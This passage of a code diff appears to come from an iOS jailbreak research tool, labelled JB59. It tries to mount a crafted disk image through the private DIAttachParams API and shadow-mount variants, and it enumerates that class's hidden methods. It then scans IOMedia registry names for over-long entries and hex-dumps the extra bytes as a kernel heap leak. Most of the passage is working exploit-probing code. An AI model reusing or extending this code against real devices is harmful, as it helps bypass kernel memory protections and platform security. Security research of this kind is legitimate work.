+            NSData *imgData = [NSData dataWithBytesNoCopy:img length:img_sz freeWhenDone:NO];
+            BOOL wrote = [imgData writeToFile:imgPath atomically:YES];
+            log([NSString stringWithFormat:@"JB59: W2 image=%d size=%u path=%@", wrote, img_sz, imgPath]);
+            free(img);
+        }
+
+        if (!imgPath) {
+            results[@"verdict"] = @"NO_IMAGE";
+            done(results);
+            return;
+        }
+        results[@"w2_image"] = @(1);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // W3: DIAttachParams — create params and attempt mount
+        log(@"JB59: --- W3: DIAttachParams mount attempt ---");
+        int w3_attached = 0;
+        int w3_init_ok = 0;
+        NSString *w3_error = nil;
+
+        Class diClass = NSClassFromString(@"DIAttachParams");
+        if (diClass) {
+            NSURL *imgURL = [NSURL fileURLWithPath:imgPath];
+            NSError *err = nil;
+
+            typedef id(*initURL_fn)(id, SEL, id, NSError**);
+            initURL_fn initFn = (initURL_fn)msg;
+
+            @try {
+                id allocd = [diClass alloc];
+                id params = initFn(allocd, @selector(initWithURL:error:), imgURL, &err);
+                if (params) {
+                    w3_init_ok = 1;
+                    log(@"JB59: W3 DIAttachParams init OK");
+
+                    @try {
+                        typedef BOOL(*boolget_fn)(id, SEL);
+                        boolget_fn boolFn = (boolget_fn)msg;
+                        BOOL autoM = boolFn(params, @selector(autoMount));
+                        BOOL persist = boolFn(params, @selector(persistentAttach));
+                        BOOL emuExt = boolFn(params, @selector(emulateExternalDisk));
+                        log([NSString stringWithFormat:@"JB59: W3 autoMount=%d persist=%d emuExt=%d", autoM, persist, emuExt]);
+                    } @catch (NSException *ex) {
+                        log([NSString stringWithFormat:@"JB59: W3 prop read err: %@", ex.reason]);
+                    }
+
+                    typedef id(*attachErr_fn)(id, SEL, NSError**);
+                    attachErr_fn attachFn = (attachErr_fn)msg;
+                    err = nil;
+
+                    @try {
+                        id handle = attachFn(params, @selector(newAttachWithError:), &err);
+                        if (handle) {
+                            w3_attached = 1;
+                            log([NSString stringWithFormat:@"JB59: W3 ATTACH SUCCESS! handle=%p", handle]);
+                        } else {
+                            w3_error = [NSString stringWithFormat:@"%@", err];
+                            log([NSString stringWithFormat:@"JB59: W3 attach failed: %@", err]);
+                        }
+                    } @catch (NSException *ex) {
+                        w3_error = ex.reason;
+                        log([NSString stringWithFormat:@"JB59: W3 attach exception: %@", ex.reason]);
+                    }
+                } else {
+                    w3_error = [NSString stringWithFormat:@"%@", err];
+                    log([NSString stringWithFormat:@"JB59: W3 init failed: %@", err]);
+                }
+            } @catch (NSException *ex) {
+                w3_error = ex.reason;
+                log([NSString stringWithFormat:@"JB59: W3 exception: %@", ex.reason]);
+            }
+        } else {
+            w3_error = @"class_not_found";
+            log(@"JB59: W3 DIAttachParams not found");
+        }
+        results[@"w3_init_ok"] = @(w3_init_ok);
+        results[@"w3_attached"] = @(w3_attached);
+        if (w3_error) results[@"w3_error"] = w3_error;
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // W4: Alternative — try initWithURL:shadowURLs:error: (shadow mount)
+        if (!w3_attached && diClass) {
+            log(@"JB59: --- W4: Shadow URL mount attempt ---");
+            @try {
+                NSURL *imgURL = [NSURL fileURLWithPath:imgPath];
+                NSError *err = nil;
+                typedef id(*initShadow_fn)(id, SEL, id, id, NSError**);
+                initShadow_fn shadowFn = (initShadow_fn)msg;
+                NSString *shadowPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"jb59_shadow.img"];
+                [[NSData data] writeToFile:shadowPath atomically:YES];
+                NSURL *shadowURL = [NSURL fileURLWithPath:shadowPath];
+                NSArray *shadows = @[shadowURL];
+                id params2 = shadowFn([diClass alloc], @selector(initWithURL:shadowURLs:error:), imgURL, shadows, &err);
+                if (params2) {
+                    log(@"JB59: W4 shadow init OK");
+                    typedef id(*attachErr_fn)(id, SEL, NSError**);
+                    attachErr_fn attachFn = (attachErr_fn)msg;
+                    err = nil;
+                    @try {
+                        id handle2 = attachFn(params2, @selector(newAttachWithError:), &err);
+                        if (handle2) {
+                            w3_attached = 1;
+                            log([NSString stringWithFormat:@"JB59: W4 SHADOW ATTACH SUCCESS! handle=%p", handle2]);
+                        } else {
+                            log([NSString stringWithFormat:@"JB59: W4 shadow attach failed: %@", err]);
+                        }
+                    } @catch (NSException *ex) {
+                        log([NSString stringWithFormat:@"JB59: W4 shadow attach exception: %@", ex.reason]);
+                    }
+                } else {
+                    log([NSString stringWithFormat:@"JB59: W4 shadow init failed: %@", err]);
+                }
+                [[NSFileManager defaultManager] removeItemAtPath:shadowPath error:nil];
+            } @catch (NSException *ex) {
+                log([NSString stringWithFormat:@"JB59: W4 exception: %@", ex.reason]);
+            }
+        }
+        results[@"w4_tried"] = @(!w3_attached ? 1 : 0);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // W5: Enumerate all DIAttachParams methods (full 45) for analysis
+        log(@"JB59: --- W5: Full method enumeration ---");
+        if (diClass) {
+            unsigned int mcount = 0;
+            Method *methods = class_copyMethodList(diClass, &mcount);
+            if (methods) {
+                for (unsigned int i = 0; i < mcount; i++) {
+                    SEL sel = method_getName(methods[i]);
+                    const char *enc = method_getTypeEncoding(methods[i]);
+                    log([NSString stringWithFormat:@"JB59: W5 [%u] %s enc=%s", i, sel_getName(sel), enc ? enc : "nil"]);
+                }
+                free(methods);
+            }
+            log([NSString stringWithFormat:@"JB59: W5 total=%u", mcount]);
+            results[@"w5_methods"] = @(mcount);
+        }
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // W6: Try hdiutil-style attach via copyWithURL class method
+        log(@"JB59: --- W6: copyWithURL class method ---");
+        if (diClass) {
+            @try {
+                typedef BOOL(*copyURL_fn)(id, SEL, id, char*, size_t, NSError**);
+                copyURL_fn copyFn = (copyURL_fn)msg;
+                NSURL *imgURL = [NSURL fileURLWithPath:imgPath];
+                char outStr[512] = {0};
+                NSError *err = nil;
+                BOOL ok = copyFn(diClass, @selector(copyWithURL:outURLStr:maxLen:error:), imgURL, outStr, 512, &err);
+                log([NSString stringWithFormat:@"JB59: W6 copyWithURL ok=%d out='%s' err=%@", ok, outStr, err]);
+                results[@"w6_copy"] = @(ok);
+            } @catch (NSException *ex) {
+                log([NSString stringWithFormat:@"JB59: W6 exception: %@", ex.reason]);
+            }
+        }
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // W7: Post-mount IOMedia scan for new entries (leaked data)
+        log(@"JB59: --- W7: Post-mount IOMedia scan ---");
+        int w7_new = 0;
+        int w7_leaked = 0;
+        {
+            unsigned int iter = 0;
+            int kr = sym_getsvcs(0, sym_matching("IOMedia"), &iter);
+            if (kr == 0 && iter) {
+                unsigned int svc;
+                while ((svc = sym_next(iter)) != 0 && !isr_stopped()) {
+                    char nm[512] = {0};
+                    sym_regname(svc, nm);
+                    NSString *name = [NSString stringWithUTF8String:nm];
+                    size_t len = strlen(nm);
+
+                    if (![preMedia containsObject:name]) {
+                        w7_new++;
+                        log([NSString stringWithFormat:@"JB59: W7 NEW media: '%@' len=%zu", name, len]);
+                    }
+
+                    if (len > 36) {
+                        w7_leaked++;
+                        NSMutableString *hex = [NSMutableString string];
+                        for (size_t i = 36; i < len && i < 256; i++) {
+                            [hex appendFormat:@"%02x", (uint8_t)nm[i]];
+                        }
+                        log([NSString stringWithFormat:@"JB59: W7 KERNEL LEAK! len=%zu leaked_hex=%@", len, hex]);
+                        results[@"w7_leaked_hex"] = hex;
+                    }
+
+                    if (sym_getprop) {
+                        char content[1024] = {0};
+                        uint32_t csz = 1024;
+                        int pr = sym_getprop(svc, "Content", content, &csz);
+                        if (pr == 0 && csz > 0) {
+                            NSString *cstr = [[NSString alloc] initWithBytes:content length:csz encoding:NSUTF8StringEncoding];
+                            if (cstr && cstr.length > 36) {
+                                log([NSString stringWithFormat:@"JB59: W7 Content prop len=%lu: %@", (unsigned long)cstr.length, cstr]);
+                            }
+                        }
+                    }
+
+                    sym_release(svc);
+                }
+                sym_release(iter);
+            }
+        }
+        results[@"w7_new"] = @(w7_new);
+        results[@"w7_leaked"] = @(w7_leaked);
+        log([NSString stringWithFormat:@"JB59: W7 new=%d leaked=%d", w7_new, w7_leaked]);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // W8: Scan IOGPTPartitionScheme / IOFDiskPartitionScheme for GPT evidence
+        log(@"JB59: --- W8: Partition scheme scan ---");
+        int w8_found = 0;
+        {
+            const char *schemes[] = {"IOGPTPartitionScheme", "IOFDiskPartitionScheme",
+                                     "IOApplePartitionScheme", "IOPartitionScheme"};
+            for (int s = 0; s < 4; s++) {
+                unsigned int iter = 0;
+                int kr = sym_getsvcs(0, sym_matching(schemes[s]), &iter);
+                if (kr == 0 && iter) {
+                    unsigned int svc;
+                    while ((svc = sym_next(iter)) != 0) {
+                        w8_found++;
+                        char nm[256] = {0};
+                        sym_regname(svc, nm);
+                        log([NSString stringWithFormat:@"JB59: W8 %s: '%s'", schemes[s], nm]);
+                        sym_release(svc);
+                    }
+                    sym_release(iter);
+                }
+            }
+        }
+        results[@"w8_schemes"] = @(w8_found);
+        log([NSString stringWithFormat:@"JB59: W8 partition schemes found=%d", w8_found]);
+
+        // Cleanup
+        [[NSFileManager defaultManager] removeItemAtPath:imgPath error:nil];
+
+        // Verdict
+        NSString *verdict = @"NO_MOUNT";
+        if (w7_leaked > 0) {
+            verdict = @"KERNEL_HEAP_LEAK";
+        } else if (w3_attached) {
+            verdict = w7_new > 0 ? @"MOUNTED_NEW_MEDIA" : @"MOUNTED_NO_LEAK";
+        } else if (w3_init_ok) {
+            verdict = @"INIT_OK_NO_ATTACH";
+        } else if (diClass) {
+            verdict = @"CLASS_FOUND";
+        }
+        results[@"verdict"] = verdict;
+        log([NSString stringWithFormat:@"JB59: Verdict: %@", verdict]);
+        isr_checkpoint(@"JB59-gpt-mount-checkpoint.json", results);
         done(results);
     });
 }
